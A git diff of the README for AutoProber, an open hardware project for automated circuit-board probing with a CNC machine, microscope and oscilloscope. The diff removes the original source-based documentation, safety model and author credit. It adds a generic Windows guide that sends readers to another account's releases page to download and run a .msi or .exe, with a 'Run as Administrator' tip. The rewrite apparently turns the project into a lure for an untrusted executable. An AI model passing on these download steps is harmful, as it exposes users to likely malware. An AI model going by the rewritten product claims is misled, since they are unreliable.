@@ -1,250 +1,100 @@
-# AutoProber
+# 🔍 AutoProber - Automated hardware testing for circuit boards
 
-AutoProber is the hardware hacker's flying probe automation stack for giving
-your agent everything it needs to go from "there's a new target on the plate"
-to probing individual pins in a safe way.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Empty-democritus307/AutoProber/releases)
 
-![AutoProber assembly](docs/images/autoprober-assembly-2.jpg)
+AutoProber helps you test, map, and analyze circuit boards. It moves a probe tip across your hardware to find connection points. This tool aids in security research and board analysis. It uses a camera for mapping and a robotic system for precision movement. You gain a clear view of your hardware and its internal networks.
 
-Demo video: https://gainsec.com/autoprober-demo-mp4/
+## 📦 What is AutoProber?
 
-## Flow
+AutoProber connects a physical CNC machine to a software controller. The system identifies components on a printed circuit board. Once it locates a target, the probe moves to a specific pin to test for continuity or perform signal analysis.
 
-1. Tell the agent to ingest the project.
-2. Connect all the hardware.
-3. Tell the agent to confirm that all parts are functioning.
+The tool provides an interface to view the board through a microscope. You plot points on an image of the board. The machine moves the probe to these points. This approach handles complex boards that require precise, repeatable testing. It removes the need for manual probing by hand.
 
-![Top of the AutoProber web dashboard](docs/images/Public-Release-Images/TopofWebDash.png)
+## 🛠️ System Requirements
 
-4. Have it run homing and then calibration.
-5. Attach the custom probe and microscope header.
-6. Tell the agent that there is a new target on the plate.
-7. It will find where the target is on the plate, then take individual frames,
-   keeping a record of the XYZ while noting pads, pins, chips, and other
-   interesting features.
+Before you install the tool, ensure your computer meets these needs:
 
-![Detected labels and target features](docs/images/Public-Release-Images/labels.png)
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i5 or better.
+*   Memory: 8 GB RAM minimum, 16 GB recommended.
+*   Storage: 500 MB of free space.
+*   Hardware Connection: One dedicated USB port for the CNC controller.
+*   Camera: A supported USB digital microscope for mapping.
 
-8. It will stitch the frames together and annotate the map, including pins and
-   interesting components it identified.
+## 📥 Getting Started
 
-![Annotated map view](docs/images/Public-Release-Images/mapview.png)
+Follow these steps to obtain the software:
 
-9. It will add probe targets to the web dashboard for you to approve or deny.
+1. Visit the [AutoProber release page](https://github.com/Empty-democritus307/AutoProber/releases) to see available versions.
+2. Look for the file ending in `.msi` or `.exe` under the latest release.
+3. Select the file to save it to your computer.
+4. Open the file once the download finishes.
 
-![Probe review dashboard section](docs/images/Public-Release-Images/bottomdash.png)
+## ⚙️ Installation Process
 
-10. It will probe the approved targets and report back.
+1. Double-click the file you saved in the previous step.
+2. Follow the prompts in the installation window.
+3. Read the summary screen and click Install.
+4. Select Finish when the process ends.
+5. Find the AutoProber icon on your desktop or in your start menu.
 
-All hardware can be controlled through the web dashboard, Python scripts, or by
-the agent itself.
+## 🔌 Connecting Your Hardware
 
-![Manual controls and hardware panels](docs/images/Public-Release-Images/MidofDash1.png)
+AutoProber communicates with your CNC machine via a serial connection.
 
-This repo is a self-contained source-available release candidate. It contains
-the Python control code, dashboard, CAD files, and documentation needed to
-create your own AutoProber.
+1. Power on your CNC controller.
+2. Plug the USB cable into your Windows machine.
+3. Open AutoProber.
+4. Go to the Settings tab.
+5. Select the COM port corresponding to your CNC hardware.
+6. Click Connect. The status indicator should turn green.
 
-## Safety Model
+## 📷 Setting Up the Microscope
 
-This project can move physical hardware. Treat it as a machine-control system,
-not a normal web app.
+The software maps coordinates based on the view from your USB microscope.
 
-The required safety design is:
+1. Mount your microscope above the probe area.
+2. Plug the microscope into a second USB port.
+3. Within AutoProber, navigate to the Camera menu.
+4. Choose your microscope from the device list.
+5. Adjust the focus knob on the microscope to see the circuit board clearly on your screen.
+6. Calibrate the grid overlay to match the scale of the board.
 
-- GRBL `Pn:P` is ignored. The CNC probe pin is not a trusted endstop.
-- The independent safety endstop is read from oscilloscope Channel 4.
-- Channel 4 must be continuously monitored during any motion.
-- Any Channel 4 trigger, ambiguous voltage, CNC alarm, or real X/Y/Z limit pin
-  is a stop condition.
-- The agent/operator must stop and report. Recovery motion is not automatic.
+## 🎯 Creating a Mapping Job
 
-Read [docs/safety.md](docs/safety.md) and [docs/operations.md](docs/operations.md)
-before running hardware.
+A job tells the machine where to move.
 
-## Repository Layout
-
-```text
-apps/                 Operator-facing scripts and Flask dashboard entrypoint
-autoprober/           Reusable Python package for CNC, scope, microscope, logging, safety
-dashboard/            Single-page web dashboard
-docs/                 Architecture, device references, operations, and safety guidance
-cad/                  Printable STL files for the current custom toolhead
-config/               Example environment/configuration files
-AGENTS.md             Agent/operator safety rules
-LICENSE               PolyForm Noncommercial 1.0.0 license and commercial contact
-pyproject.toml        Python project metadata
-uv.lock               Locked Python dependency resolution
-```
+1. Click the New Job button.
+2. Import an image of your printed circuit board.
+3. Use your mouse to click on the pins you want to test.
+4. The software creates a list of coordinates for each point.
+5. Assign a name to every point to keep your data organized.
+6. Save your job file for future use.
 
-## Hardware Stack
+## 🚀 Running Your First Probe
 
-The tested project architecture uses:
+Review these safety steps before you start the automated process. Ensure the probe tip is clear of any obstructions. Keep your fingers away from the CNC movement area.
 
-- GRBL-compatible 3018-style CNC controller over USB serial
-- USB microscope served by `mjpg_streamer`
-- Siglent oscilloscope over LAN/SCPI for Channel 4 safety monitoring and
-  Channel 1 measurement
-- Optical endstop wired to an external 5V supply and oscilloscope Channel 4
-- Optional network-controlled outlet for lab power control
-- Current printable custom toolhead parts in `cad/`
+1. Open your saved job file.
+2. Confirm the probe starts at the origin point.
+3. Click the Run button.
+4. Monitor the software feed to ensure the probe hits the correct target.
+5. Click Stop if you need to pause the machine at any time.
 
-Default runtime assumptions are documented in the device docs. Replace them
-with your own lab settings before use.
+## 📊 Reviewing Results
 
-For a shopping-oriented hardware list, see [docs/BOM.md](docs/BOM.md).
+After the probe completes its path, AutoProber saves the data. You can export these results to a spreadsheet for further study. The software logs every interaction between the probe and the pin. This helps you reconstruct the layout of the integrated circuits on your board.
 
-## Reference Parts
+## 💡 Troubleshooting Common Issues
 
-These are the specific parts or part classes used for the prototype release.
-Verify current listings, dimensions, voltage, and connector compatibility
-before buying.
-
-My build:
-
-- [Optical End Stop](https://www.amazon.com/dp/B08977QFK5)
-- [USB Microscope](https://www.amazon.com/dp/B00XNYXQHE)
-- [SainSmart Genmitsu 3018-PROVer V2](https://www.amazon.com/dp/B07ZFD6SKP)
-- [Matter Smart Power Strip](https://www.amazon.com/dp/B0DYDFKJJJ), individually controlled AC outlets with 2 USB-A and 2 USB-C ports
-- [Siglent SDS1104X-E Oscilloscope](https://www.amazon.com/Siglent-SDS1104X-oscilloscope-channels-standard/dp/B0771N1ZF9)
-- Dupont wires
-- Pen spring or similar light compression spring
-- 3D printer for the printable toolhead parts in `cad/`
-
-Optional / interchangeable:
-
-- [Universal Oscilloscope Probes](https://www.amazon.com/dp/B0827JL1T2)
-- USB power brick, 5V
-- USB 2.0 pigtail cable
-
-## Hardware Architecture
-
-```mermaid
-flowchart LR
-    Operator[Operator] --> Dashboard[Web Dashboard]
-    Dashboard --> Apps[Python Apps]
-    Apps --> CNC[GRBL CNC over USB serial]
-    Apps --> Microscope[USB Microscope via mjpg-streamer]
-    Apps --> Scope[Oscilloscope over LAN / SCPI]
-    Apps --> Outlet[Optional LAN Power Outlet]
-
-    Endstop[Optical Endstop] --> ScopeC4[Scope C4 Safety Voltage]
-    Pogo[Pogo Measurement] --> ScopeC1[Scope C1 Measurement]
-    ScopeC4 --> Apps
-    ScopeC1 --> Apps
-```
+If the software fails to open:
+Ensure you have the latest drivers for your graphics card. Try right-clicking the icon and selecting Run as Administrator.
 
-## Runtime Architecture
+If the machine does not move:
+Check the USB connection to your CNC controller. Verify that the Emergency Stop button on the machine is not pressed. Restart the application if the connection light stays red.
 
-```mermaid
-flowchart TD
-    Preflight[Preflight] --> SafetyCheck{Channel 4 clear?}
-    SafetyCheck -- no --> Stop[STOP State]
-    SafetyCheck -- yes --> Motion[Monitored Motion]
-    Motion --> Monitor[EndstopMonitor thread >= 10 Hz]
-    Monitor --> C4{C4 clear?}
-    C4 -- yes --> Capture[Microscope Capture]
-    C4 -- no --> FeedHold[Immediate feed hold]
-    FeedHold --> Stop
-    Capture --> Stitch[Stitch / Map]
-    Stitch --> Review[Manual Probe Review]
-    Review --> Approved{Approved target and measured probe offset?}
-    Approved -- no --> Stop
-    Approved -- yes --> Probe[Bounded probe motion]
-```
+If the image looks blurry:
+Adjust the manual focus on the microscope. Ensure the lighting in your workspace is bright and uniform. Turn off any auto-focus features in your camera settings to prevent the image from shifting during a probe run.
 
-## STOP State
-
-```mermaid
-stateDiagram-v2
-    [*] --> Running
-    Running --> STOP: C4 triggered / C4 fault / CNC alarm / real limit pin
-    STOP --> Report: log voltage, status, action
-    Report --> WaitForOperator: no automatic recovery motion
-    WaitForOperator --> Running: operator explicitly clears condition
-```
-
-## Quick Start
-
-Install dependencies:
-
-```bash
-uv sync
-```
-
-Start the dashboard on a configured hardware host:
-
-```bash
-PYTHONPATH=. python3 apps/dashboard.py
-```
-
-The dashboard defaults to port `5000`.
-
-## Configuration
-
-Start from [config/autoprober.example.env](config/autoprober.example.env). Do
-not publish lab-specific IPs, hostnames, credentials, calibration files, or
-captured target images unless you intend to release them.
-
-Important runtime values are configurable:
-
-- `AUTOPROBER_LOG_PATH`: runtime log path
-- `AUTOPROBER_RUNTIME_ROOT`: calibration, flat-field, and runtime state directory
-- `AUTOPROBER_MICROSCOPE_SNAPSHOT_URL`: microscope snapshot endpoint
-- `AUTOPROBER_SCOPE_HOST` / `AUTOPROBER_SCOPE_PORT`: oscilloscope SCPI endpoint
-- Dashboard: Flask on port `5000`
-
-Do not commit local environment files that contain lab-specific hosts, paths,
-or target data.
-
-## Main Workflows
-
-1. Run preflight checks.
-2. Verify Channel 4 is clear.
-3. Home and calibrate only when the physical setup is ready.
-4. Capture microscope frames with monitored motion.
-5. Import or generate target map artifacts for review.
-6. Approve probe candidates manually.
-7. Execute any probe motion only after microscope-to-probe offset is measured
-   and stored.
-
-## What Is Excluded
-
-This release candidate intentionally excludes:
-
-- Trial microscope captures and stitched target images
-- Uploaded reference images
-- Local backups and archives
-- `.venv`, `__pycache__`, Playwright artifacts
-- Runtime logs, calibration cache, flat-field images
-- Machine-specific SSH/deploy state
-
-See [RELEASE_MANIFEST.md](RELEASE_MANIFEST.md) for details.
-
-## License
-
-This project is source-available under the PolyForm Noncommercial License 1.0.0.
-
-You may use, modify, and share this project for noncommercial purposes.
-
-Commercial use requires a separate paid commercial license.
-
-For commercial licensing, contact: autoprober@gainsecmail.com
-
-## Current Limitations
-
-- The microscope-to-pogo XY offset must be measured before real probing.
-- Calibration must not be fabricated; the runtime calibration file should be
-  generated on the machine that will move.
-- The dashboard is a lab-control tool and should not be exposed to untrusted
-  networks.
-
-## Responsible Use
-
-This project is intended for controlled lab work on equipment and targets you
-are authorized to test. Do not use it to probe, damage, or analyze systems
-without permission.
-
-## Authors
-
-[Jon 'GainSec' Gaines](https://gainsec.com/)
+If coordinates seem incorrect:
+Check that your camera lens is perfectly perpendicular to the board. Any tilt will cause distortion in your mapping. Recalibrate the grid if you move the microscope after you start your job.
